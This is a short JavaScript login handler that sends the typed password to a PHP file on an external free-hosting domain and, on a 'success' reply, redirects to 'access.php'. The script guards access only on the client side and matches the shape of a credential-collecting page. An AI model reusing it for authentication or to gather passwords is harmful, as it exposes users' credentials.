document.getElementById("login-form").addEventListener("submit", function(e) {
  e.preventDefault();
  var password = document.getElementById("password").value;
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://arousedproject.000webhostapp.com/file.php", true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        if (xhr.responseText === "success") {
          window.location.href = "access.php";
        } else {
          alert("Incorrect password!");
        }
      } else {
        alert("Error: " + xhr.status);
      }
    }
  };
  xhr.send("password=" + password);
});
